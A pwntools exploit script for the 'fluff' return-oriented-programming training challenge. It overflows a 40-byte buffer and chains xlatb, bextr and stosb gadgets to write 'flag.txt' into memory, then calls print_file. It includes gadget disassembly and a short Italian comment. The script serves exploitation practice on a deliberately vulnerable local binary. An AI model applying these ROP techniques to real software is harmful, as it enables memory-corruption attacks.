from pwn import *
offset = 40

context.binary = elf = ELF('fluff')


'''
;-- questionableGadgets:
0x00400628      d7             xlatb.................eq to mov al, [ebx+al]
0x00400629      c3             ret
0x0040062a      5a             pop rdx
0x0040062b      59             pop rcx
0x0040062c      4881c1f23e00.  add rcx, 0x3ef2
0x00400633      c4e2e8f7d9     bextr rbx, rcx, rdx...eq to 
0x00400638      c3             ret
0x00400639      aa             stosb byte [rdi], al..useful
0x0040063a      c3             ret
0x0040063b      0f1f440000     nop dword [rax + rax] # multibyte nop

0x004006a3: pop rdi; ret;



[segments]
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss


devo richiamare print file con ptr to flag.txt in rdi

'''
# position of letter inside the elf file
f   = 0x004003c4
l   = 0x00400239 
a   = 0x004003d6
g   = 0x004007a0
dot = 0x0040024e
t   = 0x004006cb
x   = 0x00400778

pop_rdx_rcx_addrcx_bextr = 0x0040062a 
stosb   = 0x00400639 # stosb byte [rdi], al
xlatb   = 0x00400628 # mov al, [ebx+al] 
pop_rdi = 0x004006a3

print_flag = 0x00400510

gret = 0x004006bc
data = 0x00601029
bss  = 0x00601038
where = bss

payload = b'A'*offset
# put in ebx the address of the char
payload += p64(pop_rdx_rcx_addrcx_bextr)+p64(0x1800)+p64(f-0xb-0x3ef2)
# al = [ebx+al]
payload += p64(xlatb)
# put in rdi the addres where the char will be written
payload += p64(pop_rdi)+p64(where)
# [rdi] = al
payload += p64(stosb)

payload += p64(pop_rdx_rcx_addrcx_bextr)+p64(0x1800)+p64(l-ord('f')-0x3ef2)
payload += p64(xlatb)
payload += p64(pop_rdi)+p64(where+1)
payload += p64(stosb)

payload += p64(pop_rdx_rcx_addrcx_bextr)+p64(0x1800)+p64(a-ord('l')-0x3ef2)
payload += p64(xlatb)
payload += p64(pop_rdi)+p64(where+2)
payload += p64(stosb)
payload += p64(pop_rdx_rcx_addrcx_bextr)+p64(0x1800)+p64(g-ord('a')-0x3ef2)
payload += p64(xlatb)
payload += p64(pop_rdi)+p64(where+3)
payload += p64(stosb)
payload += p64(pop_rdx_rcx_addrcx_bextr)+p64(0x1800)+p64(dot-ord('g')-0x3ef2)
payload += p64(xlatb)
payload += p64(pop_rdi)+p64(where+4)
payload += p64(stosb)
payload += p64(pop_rdx_rcx_addrcx_bextr)+p64(0x1800)+p64(t-ord('.')-0x3ef2)
payload += p64(xlatb)
payload += p64(pop_rdi)+p64(where+5)
payload += p64(stosb)
payload += p64(pop_rdx_rcx_addrcx_bextr)+p64(0x1800)+p64(x-ord('t')-0x3ef2)
payload += p64(xlatb)
payload += p64(pop_rdi)+p64(where+6)
payload += p64(stosb)
payload += p64(pop_rdx_rcx_addrcx_bextr)+p64(0x1800)+p64(t-ord('x')-0x3ef2)
payload += p64(xlatb)
payload += p64(pop_rdi)+p64(where+7)
payload += p64(stosb)

payload += p64(pop_rdi)+p64(where)
payload += p64(print_flag)

p = elf.process()
gdb.attach(p, gdbscript = 'b main \n b *0x40063a')
p.recv()
p.sendline(payload)
log.info(p.recvall())

